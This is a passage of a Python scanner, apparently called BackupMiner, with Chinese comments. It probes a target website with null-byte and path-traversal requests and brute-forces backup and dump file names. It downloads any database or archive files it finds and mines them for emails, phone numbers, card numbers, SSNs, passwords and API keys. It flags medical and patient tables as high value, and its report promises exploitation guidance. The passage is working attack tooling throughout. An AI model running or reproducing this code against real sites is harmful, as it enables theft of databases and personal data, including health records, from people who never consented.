                            for pattern in patterns:
                                matches = re.findall(pattern, content, re.I)
                                for match in matches:
                                    filename = match[0] if isinstance(match, tuple) else match
                                    if filename and not filename.startswith('..'):
                                        found_files.add(filename)
                            
                            for filename in found_files:
                                # 提取文件大小信息
                                size_patterns = [
                                    rf'{re.escape(filename)}.*?(\d+\.?\d*\s*[KMG]?B)',
                                    rf'{re.escape(filename)}.*?(\d+)\s*bytes'
                                ]
                                
                                size_str = 'Unknown'
                                for size_pattern in size_patterns:
                                    size_match = re.search(size_pattern, content, re.I)
                                    if size_match:
                                        size_str = size_match.group(1)
                                        break
                                
                                file_url = urljoin(url, filename)
                                
                                # 智能噪音检测
                                is_noise, noise_reason = self.is_backup_noise(file_url)
                                if is_noise:
                                    self.noise_stats['noise_filtered'] += 1
                                    continue
                                
                                backup_info = {
                                    'url': file_url,
                                    'filename': filename,
                                    'size_str': size_str,
                                    'directory': directory,
                                    'found_time': datetime.now().isoformat(),
                                    'discovery_method': 'directory_listing',
                                    'value_score': self._calculate_backup_value(file_url, 0, '')
                                }
                                
                                print(f"    目录列表中发现: {filename} ({size_str})")
                                self.found_backups.append(backup_info)
                                self.noise_stats['valuable_backups'] += 1
                                
            except Exception:
                continue

    async def check_headers_and_fingerprint(self, session):
        """检查HTTP响应头和技术指纹"""
        try:
            async with session.get(self.target_url, timeout=15) as resp:
                headers = resp.headers
                
                # 检查Server header
                server = headers.get('Server', '')
                if server:
                    print(f"    服务器: {server}")
                    
                # 检查X-Powered-By
                powered_by = headers.get('X-Powered-By', '')
                if powered_by:
                    print(f"    技术栈: {powered_by}")
                    
                # 根据技术栈添加特定备份模式
                if 'PHP' in powered_by:
                    self.backup_dirs.extend([
                        '/phpmyadmin/', '/pma/', '/admin/pma/',
                        '/mysql/', '/database/', '/db/'
                    ])
                elif 'ASP.NET' in powered_by:
                    self.backup_dirs.extend([
                        '/App_Data/', '/bin/', '/backup/',
                        '/Backup/', '/Database/'
                    ])
                
                # 检查其他有趣的头部
                interesting_headers = [
                    'X-Generator', 'X-Framework', 'X-CMS', 'X-Backend',
                    'X-Drupal-Cache', 'X-Pingback', 'X-WordPress'
                ]
                
                for header in interesting_headers:
                    if header in headers:
                        print(f"    发现技术指纹: {header} = {headers[header]}")
                        
        except Exception:
            pass

    async def check_error_page_leaks(self, session):
        """检查错误页面中的路径泄露"""
        print("[+] 检查错误页面泄露...")
        
        error_triggers = [
            '/nonexistent_backup_12345.sql',
            '/admin/nonexistent_backup.zip',
            '/backup/test_file.sql',
            '/error_trigger_%s' % ('x' * 200),  # 长路径触发错误
            '/%00backup.sql',  # 空字节
            '/../backup/',     # 路径遍历
        ]
        
        for trigger in error_triggers:
            try:
                error_url = urljoin(self.target_url, trigger)
                async with session.get(error_url, timeout=10) as resp:
                    if resp.status in [400, 404, 500]:
                        content = await resp.text()
                        
                        # 在错误页面中查找路径泄露
                        path_patterns = [
                            r'(/[a-zA-Z0-9/_.-]*backup[a-zA-Z0-9/_.-]*)',
                            r'(/[a-zA-Z0-9/_.-]*dump[a-zA-Z0-9/_.-]*)',
                            r'(/[a-zA-Z0-9/_.-]*\.sql)',
                            r'(/var/[a-zA-Z0-9/_.-]*)',
                            r'(/home/[a-zA-Z0-9/_.-]*)',
                        ]
                        
                        for pattern in path_patterns:
                            matches = re.findall(pattern, content, re.I)
                            for match in matches:
                                if len(match) > 5 and any(keyword in match.lower() for keyword in ['backup', 'dump', 'sql']):
                                    print(f"    错误页面泄露路径: {match}")
                                    potential_dir = os.path.dirname(match) + '/'
                                    if potential_dir not in self.backup_dirs:
                                        self.backup_dirs.append(potential_dir)
                                        
            except Exception:
                continue

    async def check_robots_txt(self, session):
        """检查robots.txt中的备份线索"""
        try:
            url = urljoin(self.target_url, '/robots.txt')
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # 查找Disallow的备份目录
                    disallow_patterns = re.findall(r'Disallow:\s*([^\s]+)', content, re.I)
                    for pattern in disallow_patterns:
                        if any(keyword in pattern.lower() for keyword in ['backup', 'bak', 'dump', 'old', 'temp']):
                            print(f"[!] robots.txt发现备份目录: {pattern}")
                            self.backup_dirs.append(pattern)
                            
        except Exception as e:  # 注意：需要 import logging
                            
            logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    async def check_common_paths(self, session):
        """检查常见备份路径"""
        print("[+] 检查常见备份路径...")
        
        # 快速检查一些高概率路径
        quick_checks = [
            '/backup.sql', '/dump.sql', '/database.sql', '/db.sql',
            '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.zip',
            '/backup/', '/backups/', '/dump/', '/dumps/',
            '/.git.tar.gz', '/.env.backup', '/config.php.bak'
        ]
        
        tasks = []
        for path in quick_checks:
            url = urljoin(self.target_url, path)
            tasks.append(self.check_backup_exists(session, url))
            
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:
                self.found_backups.append(result)

    async def check_backup_exists(self, session, url):
        """检查备份文件是否存在"""
        try:
            # 使用HEAD请求节省带宽
            async with session.head(url, timeout=5, allow_redirects=False) as resp:
                if resp.status == 200:
                    content_length = resp.headers.get('Content-Length', '0')
                    content_type = resp.headers.get('Content-Type', '')
                    
                    # 检查文件大小和类型
                    if int(content_length) > 1000:  # 大于1KB
                        backup_info = {
                            'url': url,
                            'size': int(content_length),
                            'type': content_type,
                            'filename': os.path.basename(urlparse(url).path),
                            'found_time': datetime.now().isoformat()
                        }
                        
                        print(f"[!] 发现备份文件: {url}")
                        print(f"    大小: {self.format_size(int(content_length))}")
                        
                        return backup_info
                        
                elif resp.status == 403:
                    # 403也说明文件存在，只是无权访问
                    print(f"[?] 备份文件存在但无权访问: {url}")
                    
        except Exception as e:  # 注意：需要 import logging
                    
            logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
        return None

    async def directory_listing(self, session):
        """检查目录列表"""
        print("[+] 检查目录列表...")
        
        for directory in self.backup_dirs[:20]:  # 限制数量
            url = urljoin(self.target_url, directory)
            
            try:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # 检查是否是目录列表
                        if 'Index of' in content or 'Directory listing' in content:
                            print(f"[!] 发现目录列表: {url}")
                            
                            # 提取文件链接
                            href_pattern = r'href=["\']([^"\']+)["\']'
                            links = re.findall(href_pattern, content)
                            
                            for link in links:
                                # 检查是否是备份文件
                                if any(ext in link.lower() for ext in ['.sql', '.zip', '.tar', '.gz', '.bak', '.dump']):
                                    file_url = urljoin(url, link)
                                    
                                    # 提取文件信息
                                    size_match = re.search(rf'{re.escape(link)}.*?(\d+\.?\d*[KMG]?B)', content)
                                    size = size_match.group(1) if size_match else 'Unknown'
                                    
                                    backup_info = {
                                        'url': file_url,
                                        'filename': link,
                                        'size_str': size,
                                        'directory': directory,
                                        'found_time': datetime.now().isoformat()
                                    }
                                    
                                    print(f"[!] 目录列表中发现: {link} ({size})")
                                    self.found_backups.append(backup_info)
                                    
            except Exception as e:  # 注意：需要 import logging
                                    
                logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    async def check_headers_leak(self, session):
        """检查HTTP响应头泄露"""
        try:
            async with session.get(self.target_url, timeout=10) as resp:
                headers = resp.headers
                
                # 检查Server header
                server = headers.get('Server', '')
                if server:
                    print(f"[+] 服务器: {server}")
                    
                # 检查X-Powered-By
                powered_by = headers.get('X-Powered-By', '')
                if powered_by:
                    print(f"[+] 技术栈: {powered_by}")
                    
                # 根据技术栈添加特定备份模式
                if 'PHP' in powered_by:
                    self.backup_patterns.extend([
                        'phpmyadmin/backup/*.sql',
                        'admin/backup/*.sql',
                        'mysql_backup.sql'
                    ])
                    
        except Exception as e:  # 注意：需要 import logging
                    
            logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    async def brute_force_backups(self):
        """暴力枚举备份文件"""
        print("[+] 暴力枚举备份文件...")
        
        # 使用系统代理设置，保留并发限制
        conn = aiohttp.TCPConnector(limit=50)  # 限制并发
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # 组合目录和文件名
            tasks = []
            
            # 限制枚举数量，优先测试高概率的
            priority_patterns = [p for p in self.backup_patterns if any(k in p for k in self.db_keywords)]
            other_patterns = [p for p in self.backup_patterns if p not in priority_patterns]
            
            # 先测试优先模式
            for pattern in priority_patterns[:100]:
                for directory in ['/', '/backup/', '/dump/', '/data/']:
                    url = urljoin(self.target_url, directory + pattern)
                    tasks.append(self.check_backup_exists(session, url))
                    
            # 批量执行
            print(f"[+] 测试 {len(tasks)} 个备份路径...")
            results = await asyncio.gather(*tasks)
            
            for result in results:
                if result:
                    self.found_backups.append(result)
                    
            # 如果找到了备份，测试相似模式
            if self.found_backups:
                await self.test_similar_patterns(session)

    async def test_similar_patterns(self, session):
        """测试相似的备份模式"""
        print("[+] 测试相似备份模式...")
        
        # 基于已找到的备份生成相似模式
        similar_patterns = []
        
        for backup in self.found_backups:
            filename = backup['filename']
            base_name = filename.split('.')[0]
            
            # 提取日期模式
            date_match = re.search(r'(\d{4}[-_]?\d{2}[-_]?\d{2}|\d{6,8})', filename)
            if date_match:
                date_str = date_match.group(1)
                
                # 生成前后几天的日期
                try:
                    # 尝试解析日期
                    if '-' in date_str:
                        date_obj = datetime.strptime(date_str, '%Y-%m-%d')
                    elif '_' in date_str:
                        date_obj = datetime.strptime(date_str, '%Y_%m_%d')
                    else:
                        date_obj = datetime.strptime(date_str[:8], '%Y%m%d')
                        
                    # 生成前后7天
                    for days in range(-7, 8):
                        new_date = date_obj + timedelta(days=days)
                        new_filename = filename.replace(date_str, new_date.strftime('%Y%m%d'))
                        similar_patterns.append(new_filename)
                        
                except Exception as e:  # 注意：需要 import logging
                        
                    logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
        # 测试相似模式
        tasks = []
        for pattern in similar_patterns[:50]:
            url = urljoin(self.target_url, pattern)
            tasks.append(self.check_backup_exists(session, url))
            
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:
                self.found_backups.append(result)

    async def smart_download_backups(self):
        """智能下载备份文件 - 基于价值评分和优先级"""
        if not self.found_backups:
            print("[-] 未发现备份文件")
            return
            
        print(f"\n[+] 开始智能下载 {len(self.found_backups)} 个备份文件...")
        
        # 按价值评分排序
        sorted_backups = sorted(self.found_backups, 
                               key=lambda x: x.get('value_score', 0), 
                               reverse=True)
        
        # 使用系统代理设置
        async with aiohttp.ClientSession() as session:
            # 智能并发下载控制
            optimal_semaphore = await self.rate_controller.get_optimal_semaphore()
            
            # 根据服务器状态调整下载策略
            if self.rate_controller.server_health in ['stressed', 'overloaded']:
                download_concurrency = max(1, optimal_semaphore._value // 2)
                print(f"    服务器有压力，降低下载并发至: {download_concurrency}")
            else:
                download_concurrency = min(optimal_semaphore._value, self.download_stats['concurrent_downloads'])
            
            semaphore = asyncio.Semaphore(download_concurrency)
            tasks = []
            
            for backup in sorted_backups:
                # 智能大小检查
                max_size = 1024 * 1024 * 1024  # 1GB限制
                if backup.get('size', 0) > max_size:
                    print(f"    跳过大文件: {backup['filename']} ({self.format_size(backup['size'])})")
                    continue
                    
                # 高价值文件优先下载
                if backup.get('value_score', 0) > 50:
                    tasks.append(self.download_file_smart(session, backup, semaphore))
                elif len(tasks) < 8:  # 适度减少低价值文件下载数量
                    tasks.append(self.download_file_smart(session, backup, semaphore))
            
            print(f"    智能下载 {len(tasks)} 个文件 (并发: {download_concurrency})...")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # 统计下载结果
            successful = len([r for r in results if r and not isinstance(r, Exception)])
            failed = len(tasks) - successful
            
            self.download_stats['successful_downloads'] = successful
            self.download_stats['failed_downloads'] = failed
            
            print(f"    下载完成: 成功 {successful}, 失败 {failed}")
            
            # 显示速率控制效果
            rate_stats = self.rate_controller.get_stats()
            print(f"    速率控制效果: 请求 {rate_stats['total_requests']} 次, "
                  f"平均响应时间 {rate_stats['avg_response_time']:.2f}s")

    async def download_file_smart(self, session, backup_info, semaphore):
        """智能下载单个文件 - 支持验证和统计"""
        async with semaphore:
            url = backup_info['url']
            filename = backup_info['filename']
            
            # 创建下载目录
            download_dir = os.path.join(self.output_dir, 'downloads')
            os.makedirs(download_dir, exist_ok=True)
            
            # 生成本地文件名（避免冲突）
            local_filename = os.path.join(download_dir, filename)
            if os.path.exists(local_filename):
                base, ext = os.path.splitext(filename)
                counter = 1
                while os.path.exists(local_filename):
                    local_filename = os.path.join(download_dir, f"{base}_{counter}{ext}")
                    counter += 1
            
            try:
                print(f"    下载: {filename} (评分: {backup_info.get('value_score', 0)})")
                start_time = datetime.now()
                
                async with session.get(url, timeout=120) as resp:
                    if resp.status == 200:
                        content = await resp.read()
                        
                        # 保存文件
                        with open(local_filename, 'wb') as f:
                            f.write(content)
                        
                        # 计算文件哈希
                        md5_hash = hashlib.md5(content).hexdigest()
                        
                        # 计算下载速度
                        download_time = (datetime.now() - start_time).total_seconds()
                        speed = len(content) / download_time if download_time > 0 else 0
                        
                        download_info = {
                            'url': url,
                            'filename': filename,
                            'local_path': local_filename,
                            'size': len(content),
                            'md5': md5_hash,
                            'download_time': download_time,
                            'download_speed': speed,
                            'value_score': backup_info.get('value_score', 0),
                            'download_timestamp': datetime.now().isoformat()
                        }
                        
                        self.downloaded_files.append(download_info)
                        self.download_stats['bytes_downloaded'] += len(content)
                        
                        # 验证文件头（魔术字节）
                        if not self._validate_file_header(content, filename):
                            print(f"      警告: 文件头验证失败，可能不是真实备份")
                        
                        print(f"      完成: {self.format_size(len(content))}, "
                              f"速度: {self.format_speed(speed)}")
                        
                        # 立即快速分析
                        await self.quick_analyze_file_enhanced(local_filename, content)
                        
                        return download_info
                        
            except Exception as e:
                print(f"      下载失败 {filename}: {str(e)[:50]}")
                return None

    def _validate_file_header(self, content, filename):
        """验证文件头魔术字节"""
        if len(content) < 10:
            return False
        
        header = content[:10]
        filename_lower = filename.lower()
        
        # 常见文件格式的魔术字节
        magic_bytes = {
            '.zip': [b'PK\x03\x04', b'PK\x05\x06', b'PK\x07\x08'],
            '.sql': [b'-- MySQL dump', b'INSERT INTO', b'CREATE TABLE', b'DROP TABLE'],
            '.tar': [b'ustar\x00', b'ustar  \x00'],
            '.gz': [b'\x1f\x8b'],
            '.bz2': [b'BZ'],
            '.7z': [b'7z\xbc\xaf\x27\x1c'],
            '.rar': [b'Rar!\x1a\x07\x00', b'Rar!\x1a\x07\x01'],
        }
        
        for ext, signatures in magic_bytes.items():
            if ext in filename_lower:
                for sig in signatures:
                    if content.startswith(sig) or sig in header:
                        return True
        
        # SQL文件的文本特征检查
        if filename_lower.endswith('.sql'):
            try:
                text = content.decode('utf-8', errors='ignore')[:200]
                sql_indicators = ['CREATE', 'INSERT', 'DROP', 'SELECT', 'UPDATE', 'DELETE', '--', '/*']
                return any(indicator in text.upper() for indicator in sql_indicators)
            except:
                pass
        
        # 如果是未知格式，假设有效
        return True

    def format_speed(self, bytes_per_second):
        """格式化下载速度"""
        if bytes_per_second < 1024:
            return f"{bytes_per_second:.0f} B/s"
        elif bytes_per_second < 1024 * 1024:
            return f"{bytes_per_second/1024:.1f} KB/s"
        else:
            return f"{bytes_per_second/(1024*1024):.1f} MB/s"

    async def quick_analyze_file_enhanced(self, filepath, content):
        """增强版快速文件分析"""
        filename = os.path.basename(filepath)
        analysis_info = {
            'file': filename,
            'type': 'unknown',
            'size': len(content),
            'summary': {}
        }
        
        try:
            # SQL文件分析
            if filename.lower().endswith('.sql') or '.sql.' in filename.lower():
                # 处理压缩的SQL
                if content.startswith(b'\x1f\x8b'):
                    content = gzip.decompress(content)
                elif content.startswith(b'BZ'):
                    content = bz2.decompress(content)
                    
                text = content.decode('utf-8', errors='ignore')
                
                # 统计表和记录
                tables = re.findall(r'CREATE TABLE[^`]*`([^`]+)`', text, re.I)
                inserts = re.findall(r'INSERT INTO', text, re.I)
                
                # 敏感数据检测
                emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', text)
                phones = re.findall(r'\d{3}[-.]?\d{3}[-.]?\d{4}', text)
                
                analysis_info.update({
                    'type': 'sql',
                    'tables': len(set(tables)),
                    'records': len(inserts),
                    'emails': len(set(emails)),
                    'phones': len(set(phones)),
                    'sample_tables': list(set(tables))[:5]
                })
                
                print(f"        SQL分析: {len(set(tables))}个表, {len(inserts)}条记录")
                if emails:
                    print(f"        发现 {len(set(emails))} 个邮箱地址")
                if phones:
                    print(f"        发现 {len(set(phones))} 个电话号码")
                    
            # ZIP文件分析
            elif filename.lower().endswith('.zip'):
                try:
                    with zipfile.ZipFile(filepath, 'r') as zf:
                        file_list = zf.namelist()
                        interesting_files = [f for f in file_list 
                                           if any(ext in f.lower() for ext in ['.sql', '.csv', '.php', '.config'])]
                        
                        analysis_info.update({
                            'type': 'zip',
                            'files': len(file_list),
                            'interesting': interesting_files[:10]
                        })
                        
                        print(f"        ZIP分析: {len(file_list)}个文件, {len(interesting_files)}个重要文件")
                        
                except Exception:
                    pass
            
            # 其他文件类型的基础分析
            else:
                analysis_info['type'] = 'other'
                print(f"        文件类型: {filename.split('.')[-1] if '.' in filename else 'unknown'}")
            
            self.extracted_data.append(analysis_info)
            
        except Exception as e:
            print(f"        分析失败: {e}")

    async def deep_analyze_backups(self):
        """深度分析备份内容 - 增强版"""
        print("\n[+] 深度分析备份内容...")
        
        if not self.downloaded_files:
            print("    没有下载的文件需要分析")
            return
        
        analysis_results = []
        
        for download_info in self.downloaded_files:
            local_path = download_info['local_path']
            filename = download_info['filename']
            
            print(f"    深度分析: {filename}")
            
            try:
                with open(local_path, 'rb') as f:
                    content = f.read()
                
                analysis = await self.analyze_file_deep(local_path, content, filename)
                analysis['file_info'] = download_info
                analysis_results.append(analysis)
                
                # 如果发现高价值数据，特别标记
                if analysis.get('risk_level') == 'high':
                    print(f"      高风险数据: {analysis.get('summary', '')}")
                elif analysis.get('file_type') == 'sql' and analysis.get('tables'):
                    print(f"      SQL分析: {len(analysis['tables'])}个表, {analysis.get('records_count', 0)}条记录")
                elif analysis.get('file_type') == 'zip' and analysis.get('interesting_files'):
                    print(f"      ZIP分析: {len(analysis['interesting_files'])}个重要文件")
                
            except Exception as e:
                print(f"      分析失败: {e}")
        
        # 更新提取的数据
        if analysis_results:
            self.extracted_data.extend(analysis_results)
            print(f"    深度分析完成，共分析 {len(analysis_results)} 个文件")

    async def analyze_file_deep(self, filepath, content, filename):
        """深度文件分析"""
        analysis = {
            'filename': filename,
            'filepath': filepath,
            'size': len(content),
            'file_type': 'unknown',
            'risk_level': 'low',
            'sensitive_data': {},
            'summary': '',
            'recommendations': []
        }
        
        try:
            # 根据文件类型进行不同的分析
            if filename.lower().endswith('.sql') or '.sql.' in filename.lower():
                analysis.update(await self._analyze_sql_deep(content))
            elif filename.lower().endswith('.zip'):
                analysis.update(await self._analyze_zip_deep(filepath))
            elif filename.lower().endswith(('.tar', '.tar.gz', '.tgz')):
                analysis.update(await self._analyze_tar_deep(filepath))
            elif filename.lower().endswith('.json'):
                analysis.update(await self._analyze_json_deep(content))
            elif filename.lower().endswith('.xml'):
                analysis.update(await self._analyze_xml_deep(content))
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis

    async def _analyze_sql_deep(self, content):
        """深度SQL文件分析"""
        analysis = {
            'file_type': 'sql',
            'tables': [],
            'records_count': 0,
            'sensitive_data': {},
            'database_info': {}
        }
        
        try:
            # 处理压缩的SQL文件
            if content.startswith(b'\x1f\x8b'):  # gzip压缩
                content = gzip.decompress(content)
            elif content.startswith(b'BZ'):  # bzip2压缩
                content = bz2.decompress(content)
            
            text = content.decode('utf-8', errors='ignore')
            
            # 提取数据库信息
            db_match = re.search(r'Database:\s*`?([^`\s]+)`?', text, re.I)
            if db_match:
                analysis['database_info']['name'] = db_match.group(1)
            
            # 提取表结构
            table_patterns = [
                r'CREATE TABLE[^`]*`([^`]+)`',
                r'DROP TABLE[^`]*`([^`]+)`'
            ]
            
            all_tables = set()
            for pattern in table_patterns:
                tables = re.findall(pattern, text, re.I)
                all_tables.update(tables)
            
            analysis['tables'] = list(all_tables)
            
            # 统计记录数
            insert_count = len(re.findall(r'INSERT INTO', text, re.I))
            analysis['records_count'] = insert_count
            
            # 敏感数据检测
            sensitive_patterns = {
                'emails': r'[\w\.-]+@[\w\.-]+\.\w+',
                'phones': r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',
                'credit_cards': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
                'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
                'passwords': r'password[\'\"]\s*:\s*[\'\"](.*?)[\'\"](.*?),?',
                'api_keys': r'[\'\"](api_key|apikey|api-key)[\'\"]\s*:\s*[\'\"](.*?)[\'\"](.*?),?'
            }
            
            for data_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, text, re.I)
                if matches:
                    analysis['sensitive_data'][data_type] = {
                        'count': len(set(matches)),
                        'samples': list(set(matches))[:5]  # 只保存前5个样本
                    }
            
            # 风险评估
            risk_score = 0
            if analysis['sensitive_data']:
                risk_score += 30
            if any(keyword in text.lower() for keyword in ['patient', 'medical', 'health']):
                risk_score += 40
            if len(analysis['tables']) > 10:
                risk_score += 20
            if analysis['records_count'] > 1000:
                risk_score += 10
            
            if risk_score > 60:
                analysis['risk_level'] = 'high'
            elif risk_score > 30:
                analysis['risk_level'] = 'medium'
            
            # 生成摘要
            analysis['summary'] = f"SQL备份: {len(analysis['tables'])}个表, {analysis['records_count']}条记录"
            if analysis['sensitive_data']:
                sens_types = ', '.join(analysis['sensitive_data'].keys())
                analysis['summary'] += f", 包含敏感数据: {sens_types}"
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis

    async def _analyze_zip_deep(self, filepath):
        """深度ZIP文件分析"""
        analysis = {
            'file_type': 'zip',
            'files_count': 0,
            'interesting_files': [],
            'compressed_ratio': 0
        }
        
        try:
            with zipfile.ZipFile(filepath, 'r') as zf:
                file_list = zf.namelist()
                analysis['files_count'] = len(file_list)
                
                # 查找有趣的文件
                interesting_extensions = ['.sql', '.csv', '.json', '.xml', '.php', '.config', '.env']
                for filename in file_list:
                    if any(ext in filename.lower() for ext in interesting_extensions):
                        analysis['interesting_files'].append(filename)
                
                # 计算压缩比
                total_compressed = sum(zf.getinfo(name).compress_size for name in file_list)
                total_uncompressed = sum(zf.getinfo(name).file_size for name in file_list)
                if total_uncompressed > 0:
                    analysis['compressed_ratio'] = total_compressed / total_uncompressed
                
                analysis['summary'] = f"ZIP归档: {len(file_list)}个文件"
                if analysis['interesting_files']:
                    analysis['summary'] += f", {len(analysis['interesting_files'])}个重要文件"
                
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis

    async def _analyze_tar_deep(self, filepath):
        """深度TAR文件分析"""
        analysis = {
            'file_type': 'tar',
            'files_count': 0,
            'directories_count': 0,
            'interesting_files': []
        }
        
        try:
            with tarfile.open(filepath, 'r:*') as tf:
                members = tf.getmembers()
                analysis['files_count'] = len([m for m in members if m.isfile()])
                analysis['directories_count'] = len([m for m in members if m.isdir()])
                
                # 查找有趣的文件
                for member in members:
                    if member.isfile():
                        if any(ext in member.name.lower() for ext in ['.sql', '.config', '.env', '.php']):
                            analysis['interesting_files'].append(member.name)
                
                analysis['summary'] = f"TAR归档: {analysis['files_count']}个文件, {analysis['directories_count']}个目录"
                
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis

    async def _analyze_json_deep(self, content):
        """深度JSON文件分析"""
        analysis = {'file_type': 'json'}
        
        try:
            data = json.loads(content.decode('utf-8', errors='ignore'))
            analysis['structure'] = type(data).__name__
            
            if isinstance(data, list):
                analysis['records_count'] = len(data)
                if data and isinstance(data[0], dict):
                    analysis['fields'] = list(data[0].keys())
            elif isinstance(data, dict):
                analysis['keys'] = list(data.keys())
            
            analysis['summary'] = f"JSON数据: {analysis.get('records_count', '结构化')}记录"
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis

    async def _analyze_xml_deep(self, content):
        """深度XML文件分析"""
        analysis = {'file_type': 'xml'}
        
        try:
            text = content.decode('utf-8', errors='ignore')
            
            # 计算XML元素
            elements = re.findall(r'<(\w+)[\s>]', text)
            analysis['elements'] = list(set(elements))
            analysis['elements_count'] = len(elements)
            
            analysis['summary'] = f"XML文档: {len(analysis['elements'])}种元素类型"
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis

    async def download_file(self, session, backup_info):
        """下载单个文件"""
        url = backup_info['url']
        filename = backup_info['filename']
        
        # 创建下载目录
        download_dir = os.path.join(self.output_dir, 'downloads')
        os.makedirs(download_dir, exist_ok=True)
        
        # 生成本地文件名
        local_filename = os.path.join(download_dir, filename)
        
        # 避免覆盖
        if os.path.exists(local_filename):
            base, ext = os.path.splitext(filename)
            counter = 1
            while os.path.exists(local_filename):
                local_filename = os.path.join(download_dir, f"{base}_{counter}{ext}")
                counter += 1
                
        try:
            print(f"[+] 下载: {filename}")
            
            async with session.get(url, timeout=60) as resp:
                if resp.status == 200:
                    content = await resp.read()
                    
                    # 保存文件
                    with open(local_filename, 'wb') as f:
                        f.write(content)
                        
                    # 计算MD5
                    md5_hash = hashlib.md5(content).hexdigest()
                    
                    download_info = {
                        'url': url,
                        'filename': filename,
                        'local_path': local_filename,
                        'size': len(content),
                        'md5': md5_hash,
                        'download_time': datetime.now().isoformat()
                    }
                    
                    self.downloaded_files.append(download_info)
                    print(f"[] 下载完成: {filename} ({self.format_size(len(content))})")
                    
                    # 立即分析
                    await self.quick_analyze_file(local_filename, content)
                    
        except Exception as e:
            print(f"[-] 下载失败 {filename}: {e}")

    async def quick_analyze_file(self, filepath, content):
        """快速分析下载的文件"""
        filename = os.path.basename(filepath)
        
        # SQL文件分析
        if filename.endswith('.sql') or '.sql.' in filename:
            try:
                # 如果是压缩的SQL
                if filename.endswith('.gz'):
                    import gzip
                    content = gzip.decompress(content)
                elif filename.endswith('.bz2'):
                    import bz2
                    content = bz2.decompress(content)
                    
                text = content.decode('utf-8', errors='ignore')
                
                # 统计表
                tables = re.findall(r'CREATE TABLE[^`]*`([^`]+)`', text, re.I)
                if tables:
                    print(f"    发现 {len(set(tables))} 个数据表")
                    
                    # 查找患者相关表
                    patient_tables = [t for t in tables if any(k in t.lower() for k in ['patient', 'user', 'appointment', 'medical'])]
                    if patient_tables:
                        print(f"    [!] 患者相关表: {', '.join(patient_tables[:5])}")
                        
                # 统计记录数
                inserts = re.findall(r'INSERT INTO[^`]*`([^`]+)`', text, re.I)
                if inserts:
                    print(f"    包含 {len(inserts)} 条INSERT语句")
                    
                # 查找敏感数据
                emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', text)
                phones = re.findall(r'\d{3}[-.]?\d{3}[-.]?\d{4}', text)
                
                if emails:
                    print(f"    [!] 发现 {len(set(emails))} 个邮箱地址")
                if phones:
                    print(f"    [!] 发现 {len(set(phones))} 个电话号码")
                    
                self.extracted_data.append({
                    'file': filename,
                    'type': 'sql',
                    'tables': list(set(tables))[:20],
                    'records': len(inserts),
                    'emails': len(set(emails)),
                    'phones': len(set(phones))
                })
                
            except Exception as e:
                pass
                
        # ZIP文件分析
        elif filename.endswith('.zip'):
            try:
                import zipfile
                with zipfile.ZipFile(filepath, 'r') as zf:
                    file_list = zf.namelist()
                    print(f"    ZIP包含 {len(file_list)} 个文件")
                    
                    # 查找感兴趣的文件
                    interesting_files = [f for f in file_list if any(ext in f.lower() for ext in ['.sql', '.csv', '.xls', '.json', '.xml', 'config', '.env'])]
                    if interesting_files:
                        print(f"    [!] 重要文件: {', '.join(interesting_files[:5])}")
                        
                    self.extracted_data.append({
                        'file': filename,
                        'type': 'zip',
                        'files': len(file_list),
                        'interesting': interesting_files[:10]
                    })
                    
            except Exception as e:  # 注意：需要 import logging
                    
                logging.warning(f"异常被忽略: {type(e).__name__}: {str(e)}")
    async def analyze_backups(self):
        """深度分析备份文件"""
        print("\n[+] 深度分析备份文件...")
        
        # 这里可以添加更复杂的分析逻辑
        # 比如：解压文件、解析数据库、提取敏感信息等
        pass

    def format_size(self, size):
        """格式化文件大小"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.2f} {unit}"
            size /= 1024.0
        return f"{size:.2f} TB"

    def generate_smart_report(self):
        """生成智能化报告 - 包含风险评估和利用指导"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # 综合分析
        analysis = self._analyze_backup_results()
        
        # 生成详细报告
        report = {
            'meta': {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
                'scanner_version': 'BackupMiner v2.0 (Enhanced)',
                'scan_id': f"BM_{timestamp}",
                'noise_filter_enabled': NOISE_FILTER_AVAILABLE
            },
            
            # 技术栈信息
            'technology_stack': self.detected_tech_stack,
            
            # 发现统计
            'discovery_stats': {
                'total_backups_found': len(self.found_backups),
                'successful_downloads': len(self.downloaded_files),
                'total_size': sum(f.get('size', 0) for f in self.downloaded_files),
                'high_value_backups': len([b for b in self.found_backups if b.get('value_score', 0) > 70]),
                'discovery_methods': self._group_by_discovery_method()
            },
            
            # 备份详情
            'backups': self.found_backups,
            'downloads': self.downloaded_files,
            'extracted_data': self.extracted_data,
            
            # 风险评估
            'risk_assessment': analysis['risk_assessment'],
            
            # 噪音过滤统计
            'noise_filtering_stats': self.noise_stats,
            
            # 下载性能统计
            'download_performance': self.download_stats,
            
            # 智能速率控制统计
            'rate_control_stats': self.rate_controller.get_stats(),
            
            # WAF欺骗检测统计
            'waf_deception_stats': self.deception_detector.get_detection_stats(),
            'baseline_detection_info': self.baseline_detector.get_baseline_info(),
            
            # 建议和下一步
            'recommendations': analysis['recommendations']
        }
        
